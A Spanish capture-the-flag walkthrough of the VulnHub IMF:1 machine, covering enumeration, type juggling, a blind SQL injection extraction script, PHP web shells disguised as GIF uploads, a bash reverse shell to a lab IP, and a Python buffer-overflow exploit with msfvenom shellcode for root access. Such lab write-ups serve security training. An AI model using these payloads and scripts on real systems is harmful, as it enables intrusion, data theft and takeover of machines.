#ctf-machine #vulnhub #medium-machine #linux [Vulnhub Link](https://www.vulnhub.com/entry/imf-1,162/)

## Enumeración inicial
Primeramente hacemos un escaneo ARP para identificar la máquina víctima:
![[Pasted image 20240818162158.png]]

### Nmap
Realizamos un escaneo de puertos abiertos por el protocolo TCP y exportamos la evidencia en el archivo openPorts:
```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG openPorts 192.168.1.41
```

![[Pasted image 20240818162655.png]]
Únicamente hay abierto el puerto 80.

Ahora realizamos un escaneo que permite obtener la versión y servicio del puerto abierto y la evidencia la exportamos en el archivo services. Para hacerlo usamos el siguiente comando de nmap:
```bash
nmap -p80 -sCV -oN services 192.168.1.41
```

![[Pasted image 20240818163136.png]]

Podemos ver como se trata de un sistema Linux, además de correr un servidor Apache 2.4.18.

### Wappalyzer & whatweb
Si realizamos un escaneo con whatweb obtenemos:
![[Pasted image 20240818163518.png]]

Wappalyzer nos detecta lo siguiente:
![[Pasted image 20240818163627.png]]

## Flag 1
La página principal:
![[Pasted image 20240818163911.png]]

Dentro de la página `/contact.php` encontramos 3 correos:
![[Pasted image 20240818164156.png]]

Si miramos el código fuente de `/contact.php` podemos ver un comentario con una *flag* que parece estar en base64:
![[Pasted image 20240818171527.png]]

Si decodificamos en base64 la *flag* obtenemos:
![[Pasted image 20240818171615.png]]

## Flag 2
Debemos intuir 💀 y después de mucho reconocimiento que si nos fijamos en los nombres de los archivos JS parece ser que al unir los nombres se forma una cadena en base 64 (es a lo que hace referencia la *flag* "allthefiles"):
![[Pasted image 20240818174251.png]]

Si unimos la los nombres en orden obtenemos la cadena en base 64 que al decodificarla obtenemos:
![[Pasted image 20240818174339.png]]

Y decodificamos la segunda *flag*:
![[Pasted image 20240818174448.png]]

## Flag 3
Podemos intuir 💀 que se trate del nombre de un directorio así que probamos y accedemos a esta página:
![[Pasted image 20240818180240.png]]

Si miramos la fuente podemos obtener la siguiente información:
![[Pasted image 20240818180333.png]]
Por lo que podemos intuir que no se está utilizando SQL por detrás.

Al probar iniciar sesión con usuario y contraseña aleatoria obtenemos esto:

Por lo que tenemos una forma potencial de enumerar usuarios.
![[Pasted image 20240818181038.png]]

Al probar con los usuarios de los correos anteriores descubrimos que "rmichaels" es un usuario válido, ya que no nos muestra "Invalid username":
![[Pasted image 20240818181014.png]]

Así que intentamos hacer fuerza bruta para averiguar la contraseña, pero parece ser que hay una protección de solicitudes por lo que llevaría mucho tiempo para "fuzzear" la contraseña. 

Por lo que podemos probar un type juggling, ya que si esta "hardcodeada" la contraseña seguramente se haga una comparación entre el input de password y la contraseña:
![[Pasted image 20240818181829.png]]

Esta es la página obtenida.
![[Pasted image 20240818181900.png]]

Si decodificamos la *flag* nos dan una pista:
![[Pasted image 20240818182054.png]]

## Flag 4
Si en el apuntador de la página que se muestra ponemos una comilla podemos ver como se genera un error de MySQL:
![[Pasted image 20240818185952.png]]

Por lo que podemos generar una SQL Injection booleana con:
![[Pasted image 20240818200938.png]]

Y crear un script que permita extraer la base de datos.

> [!NOTE] La base de datos se ha extraido con el siguiente script: [[#Script Python SQL Injection]]

Nombres de base de datos:
![[Pasted image 20240818201258.png]]

La base de datos "admin" es la que nos interesa, obtenemos sus tablas:
![[Pasted image 20240818203423.png]]

Solo hay una tabla llamada "pages", si listamos sus columnas:
![[Pasted image 20240818203541.png]]

Por lo que listamos los "pagesname" de la base de datos:
![[Pasted image 20240818203647.png]]

Podemos ver una nueva página que no conocemos: "tutorials-incomplete". Accedemos a ella y podemos ver una imagen con un código QR que al escanearlo obtenemos la 4.ª flag:

![[Pasted image 20240818203830.png]]

![[Pasted image 20240818204121.png]]

Si descodificamos la *flag* obtenemos el nombre de un fichero que parece ser el fichero de la funcionalidad que no estaba disponible:
![[Pasted image 20240818204238.png]]

## Flag 5
Si entramos en `/uploadr942.php` podemos ver:
![[Pasted image 20240818204407.png]]

Si intentamos subir un archivo `cmd.php` con este contenido:
```php
<?php
	system($_GET['cmd']);
?>
```

Nos prohíbe la subida del archivo:
![[Pasted image 20240818212125.png]]

Si intentamos subir un archivo `cmd.gif` con este contenido para modificar los magic numbers del archivo y que detecte que es un gif:
```php
GIF87a

<?php
	system($_GET['cmd']);
?>
```

Ya no sale el error "Invalid file type" sino que sale lo siguiente:
![[Pasted image 20240818222530.png]]

Por lo que optamos por utilizar otro código php:
```php
GIF87a

<?php
  $c=$_GET['cmd'];
  echo `$c`;
?>
```

Con este código sí que es posible subir el archivo y como se puede ver en el código fuente se le asigna el siguiente nombre:
![[Pasted image 20240818222730.png]]

Por lo que si accedemos a `uploads/2f8f1c9cffab.gif` y posteriormente utilizamos el parámetro `cmd` tenemos ejecución remota de comandos, ya que la web interpreta el código php aunque el archivo tenga extension .gif:
![[Pasted image 20240818222920.png]]

Por lo que si ejecutamos el comando:
```bash
bash -c "bash -i >& /dev/tcp/192.168.1.21/443 0>&1"
```

Y nos ponemos en escucha por el puerto 443 con `nc`, obtenemos una reverse Shell:
![[Pasted image 20240818223320.png]]

Hacemos el tratamiento de la TTY con:
![[Pasted image 20240818223633.png]]
![[Pasted image 20240818223814.png]]

En el mismo directorio uploads obtenemos la 5ta flag:
![[Pasted image 20240818223940.png]]

Si decodificamos la *flag* obtenemos:
![[Pasted image 20240818224128.png]]

## Flag 6
Si hacemos una búsqueda por la palabra agent en el sistema dada la pista de la *flag* encontramos dos ficheros poco usuales en el sistema:
![[Pasted image 20240818234036.png]]

Si mostramos el contenido del archivo `/etc/xintetd.d/agent` podemos ver información como las palabras service agent encontradas en la *flag*, y el puerto que parece ser que se abre al  ejecutar el binario:
![[Pasted image 20240818234224.png]]

Por lo que si listamos las conexiones de la máquina podemos ver que el puerto 7788 está abierto:
![[Pasted image 20240819001931.png]]

Además de que lo ejecuta root, ya que al conectarnos con nc al localhost por el puerto 7788 aparece este proceso correspondiente al binario:
![[Pasted image 20240819002103.png]]
![[Pasted image 20240819002214.png]]

Si somos capaces de causar *buffer overflow* podemos ejecutar codigo malicioso que nos permita elevar privilegios.

Por lo que procedemos a analizarlo con ghidra para ver si somos capaces de ver primero el Agent ID correcto haciendo ingeniería inversa.
![[Pasted image 20240819000827.png]]

Como se puede ver se está comparando el input del usuario guardado en "local_22" con "local_28" que se le asigna el valor de "0x2ddd984" que si lo pasamos a decimal obtenemos el valor de "48093572" correspondiente al Agent ID.

Por lo que si introducimos el valor correcto obtenemos este *output*:
![[Pasted image 20240819001218.png]]

Si buscamos con ghidra algún input de usuario vulnerable podemos observar que la función de "Submit Report" hace uso de la función `gets()` de C para obtener el input del usuario. 
![[Pasted image 20240819002348.png]]

Por lo que permite crear un buffer overflow al introducir más de 164 carácteres:
![[Pasted image 20240819002709.png]]

Si analizamos con gdb (gdb-peda) los registros podemos ver como al introducir muchos caracteres se sobrescribe el registro EIP encargado de apuntar a la siguiente instrucción
![[Pasted image 20240819105216.png]]

Por lo que nos interesa generar un pattern para averiguar cuál es el offset hasta llegar al EIP:
![[Pasted image 20240819112655.png]]
![[Pasted image 20240819112743.png]]

Como vemos aparece Af6A en el registro por lo que podemos averiguar el offset:
![[Pasted image 20240819112835.png]]

Una vez tenemos el offset sabemos que debemos generar 168 caracteres antes de sobrescribir el registro EIP. Generamos un pattern con Python para ver si en el EIP es escriben tres 'B' y el offset es correcto:
![[Pasted image 20240819112925.png]]

Como podemos ver es correcto y ya tenemos el control del EIP:
![[Pasted image 20240819113039.png]]

 Ahora, analizamos el binario y el sistema para ver qué protecciones están activas y concluir donde debemos apuntar. Y como podemos ver la protección de ejecución en pila esta desactivada por lo que podemos crear nuestro *shellcode* en la pila para apuntar con el EIP al ESP y ejecutar comandos.
![[Pasted image 20240819113356.png]]

Pero podemos ver que el ASLR está activado en la máquina víctima:
![[Pasted image 20240819115228.png]]

Aun así si analizamos donde tenemos capacidad de escritura podemos ver que estamos rellenando primeramente con las 'A' el registro EAX:
![[Pasted image 20240819115129.png]]

Por lo que podemos hacer *bypass* del ASLR haciendo una llamada CALL EAX para que el flujo del programa vaya directamente donde apunta EAX y ejecutar el código malicioso.

Generamos el shellcode con msfvenom para entablar una revershell por el puerto 443:
![[Pasted image 20240819115931.png]]

Este shellcode serán los primeros 95 bytes concatenados de un relleno de 'A' hasta llegar al *offset*. Por lo que únicamente nos falta encontrar en el binario la dirección de la instrucción CALL EAX para introducirla en el EIP.

Por lo que primero sacamos el opcode con la funcionalidad nasm:
![[Pasted image 20240819121421.png]]

El opcode es FFD0 por tanto, lo buscamos usando objdump para saber la dirección de memoria de esta instrucción:
![[Pasted image 20240819121512.png]]

Únicamente ponemos la dirección en little endian desde Python y mediante un socket nos conectamos desde la máquina víctima al puerto 7788 para ejecutar el Buffer Overflow.

> [!NOTE] El Buffer Overflow se ha explotado con el siguiente script de Python: [[#Script Python Buffer Overflow]]

Si ejecutamos el script obtenemos la reverse Shell como root.
![[Pasted image 20240819123540.png]]
![[Pasted image 20240819123635.png]]

Y podemos visualizar la última *flag* en el directorio `/root`:
![[Pasted image 20240819123728.png]]

Que si la decodificamos obtenemos:
![[Pasted image 20240819123818.png]]


## Script Python SQL Injection
```python
from termcolor import colored
from pwn import *
import sys, requests, signal, string, time

def sig_handler(sig, frame):
    print(colored("\n\n[!] Exiting...\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, sig_handler)

url = "http://192.168.1.41/imfadministrator/cms.php"
cookies = {"PHPSESSID": "msrbuot4qstd0r9nvh0naotma4"}
filter = "Under Construction"


def get_databases():
    characters = string.ascii_letters + string.digits + "," + "_" + " "
    p1 = log.progress("Extracting names of databases")
    p1.status("")
    p2 = log.progress("Starting brute force")
    time.sleep(1)
    names = ""

    for pos in range(1, 100):
        for char in characters:
            p2.status(char)
            params = {"pagename": f"upload' and (select concat(ascii(substring(group_concat(schema_name),{pos},1))) from information_schema.schemata) = '{ord(char)}"}
            r = requests.get(url, params=params, cookies=cookies)
            if filter in str(r.content):
                names += char
                p1.status(names)
                break
            
            if char == ' ':
                print(colored("[i] Finish", 'yellow'))
                sys.exit(0)


def get_tables(database_name):
    characters = string.ascii_letters + string.digits + "," + "_" + " "
    p1 = log.progress(f"Extracting tables of {database_name} database")
    p1.status("")
    p2 = log.progress("Starting brute force")
    time.sleep(1)
    names = ""

    for pos in range(1, 100):
        for char in characters:
            p2.status(char)
            params = {"pagename": f"upload' and (select concat(ascii(substring(group_concat(table_name),{pos},1))) from information_schema.tables where table_schema='{database_name}') = '{ord(char)}"}
            r = requests.get(url, params=params, cookies=cookies)
            if filter in str(r.content):
                names += char
                p1.status(names)
                break
            
            if char == ' ':
                print(colored("[i] Finish", 'yellow'))
                sys.exit(0)

def get_columns(database_name, table_name):
    characters = string.ascii_letters + string.digits + "," + "_" + " "
    p1 = log.progress(f"Extracting columns of {table_name} table")
    p1.status("")
    p2 = log.progress("Starting brute force")
    time.sleep(1)
    names = ""

    for pos in range(1, 100):
        for char in characters:
            p2.status(char)
            params = {"pagename": f"upload' and (select concat(ascii(substring(group_concat(column_name),{pos},1))) from information_schema.columns where table_schema='{database_name}' and table_name='{table_name}') = '{ord(char)}"}
            r = requests.get(url, params=params, cookies=cookies)
            if filter in str(r.content):
                names += char
                p1.status(names)
                break
            
            if char == ' ':
                print(colored("[i] Finish", 'yellow'))
                sys.exit(0)

def get_data(database_name, table_name, column_name):
    characters = string.printable
    p1 = log.progress(f"Extracting data of {column_name} column")
    p1.status("")
    p2 = log.progress("Starting brute force")
    time.sleep(1)
    names = ""

    for pos in range(1, 100):
        for char in characters:
            p2.status(char)
            params = {"pagename": f"upload' and (select concat(ascii(substring(group_concat({column_name}),{pos},1))) from {database_name}.{table_name}) = '{ord(char)}"}
            r = requests.get(url, params=params, cookies=cookies)
            if filter in str(r.content):
                names += char
                p1.status(names)
                break
            
            if char == ' ':
                print(colored("[i] Finish", 'yellow'))
                sys.exit(0)



if __name__ == '__main__':
    # get_databases()
    # get_tables('admin')
    # get_columns('admin', 'pages')
    get_data('admin', 'pages', 'pagename')
```

## Script Python Buffer Overflow
```python
from struct import pack
import socket

shell_code = (b"\x2b\xc9\x83\xe9\xef\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
b"\x0e\xbf\x17\xd4\x33\x83\xee\xfc\xe2\xf4\x8e\xcc\x23\xd0"
b"\xec\x54\x87\x59\xbd\x9e\x35\x83\xd9\xda\x54\xa0\xe6\xa7"
b"\xeb\xfe\x3f\x5e\xad\xca\xd7\xd7\x7c\x32\xaa\x7f\xd6\x33"
b"\xbe\xac\x5d\xd2\x0f\x71\x84\x62\xec\xa4\xd7\xba\x5e\xda"
b"\x54\x61\xd7\x79\xfb\x40\xd7\x7f\xfb\x1c\xdd\x7e\x5d\xd0"
b"\xed\x44\x5d\xd2\x0f\x1c\x19\xb3")

offset = 168

eip = 0x08048563
eip = pack("<I", eip)

payload = shell_code + b'A'*(offset-len(shell_code)) + eip + b"\n"


ip = "127.0.0.1"
port = 7788

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
print(s.recv(1024).decode(), end="")
print(48093572)
s.send(b"48093572\n")
print(s.recv(1024).decode())
print(s.recv(1024).decode(), end="")
s.send(b"3\n")
print(3)
print(s.recv(1024).decode(), end="")
s.send(payload)
print(s.recv(1024))
```

___
#buffer-overflow #type-juggling #sqli #file-upload-attacks #reverse-engineer #waf-bypass #ret2reg
___
